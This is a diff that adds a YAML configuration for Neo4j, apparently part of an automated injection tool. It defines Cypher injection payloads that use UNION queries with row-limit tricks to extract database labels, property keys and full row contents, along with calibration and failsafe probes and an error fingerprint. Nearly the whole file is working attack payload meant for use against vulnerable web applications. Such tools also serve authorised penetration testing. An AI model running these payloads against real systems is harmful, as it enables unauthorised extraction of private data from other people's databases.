@@ -1,0 +1,108 @@
+vendor: ""
+resource: 
+ info: |
+  '' AS A LIMIT 0 UNION 
+  MATCH (n)
+  RETURN DISTINCT 
+      '${LEAD}' 
+      %2b '-'
+      %2b '${ENCLOSE_VALUE_SQL}' 
+      %2b '-' 
+      %2b '${ENCLOSE_VALUE_SQL}' 
+      %2b '-' 
+      %2b '${TRAIL_SQL}'
+ schema: 
+  database: |
+   '' AS A LIMIT 0 UNION
+   MATCH (n)
+   RETURN DISTINCT 
+       '${LEAD}${ENCLOSE_VALUE_SQL}neo4j${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}${TRAIL_SQL}'
+       AS A
+   {limit}
+   UNION MATCH (n:blah) RETURN n
+  table: |
+   '' AS A LIMIT 0 UNION
+   CALL db.labels() 
+   YIELD label 
+   WITH label
+   {limit}
+   RETURN 
+       '${LEAD}' 
+       %2b reduce(
+           b = '', 
+           n IN collect(label) | 
+               b 
+               %2b '${ENCLOSE_VALUE_SQL}'
+               %2b n 
+               %2b '${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}'
+       ) 
+       %2b '${TRAIL_SQL}'
+       AS A
+   UNION MATCH (n:blah) RETURN n
+  column: |
+   '' AS A LIMIT 0 UNION
+   MATCH (n:${TABLE}) 
+   WITH collect(keys(n)) AS attr 
+   UNWIND attr AS r 
+   WITH DISTINCT r[0] AS d 
+   ORDER BY d 
+   {limit}
+   RETURN 
+       '${LEAD}' 
+       %2b reduce(
+           b = '', 
+           n IN collect(d) | 
+           b 
+           %2b '${ENCLOSE_VALUE_SQL}'
+           %2b n
+           %2b '${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}'
+       ) 
+   %2b '${TRAIL_SQL}'
+   AS A
+   UNION MATCH (n:blah) RETURN n
+  row: 
+   query: |
+    '' AS A LIMIT 0 UNION
+    MATCH (n:${TABLE})
+    WITH DISTINCT n
+    {limit}
+    RETURN 
+        '${LEAD}' 
+        %2b reduce(
+            b = \"\", 
+            n IN collect(n) | 
+            b 
+            %2b '${ENCLOSE_VALUE_SQL}'
+            %2b ${FIELDS}
+            %2b '${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}'
+        )
+    %2b '${TRAIL_SQL}'
+    AS A
+    UNION MATCH (n:blah) RETURN n
+   fields: 
+    field: "coalesce(n.${FIELD}, '')"
+    concat: "%2b '%7f' %2b"
+strategy: 
+ configuration: 
+  slidingWindow: "${INJECTION}"
+  limit: "skip ${LIMIT} LIMIT 65536"
+  failsafe: "MATCH (n) RETURN 1337${INDICE}7330%2b1 AS A"
+  calibrator: |
+   '' AS A LIMIT 0 UNION 
+   MATCH (n) 
+   RETURN 
+       '${LEAD}${INDICE}'
+       %2b reduce(
+           a = \"\", 
+           nn IN collect(n) | 
+           a %2b \"${CALIBRATOR_SQL}\"
+       )
+  limitBoundary: 0
+  endingComment: "//"
+  fingerprint: 
+   errorMessage: 
+    - neo4j
+ normal: 
+  indices: "RETURN 'A' AS A UNION ${INDICES}"
+  capacity: "${CALIBRATOR}"
+  orderBy: "ORDER BY 1337"
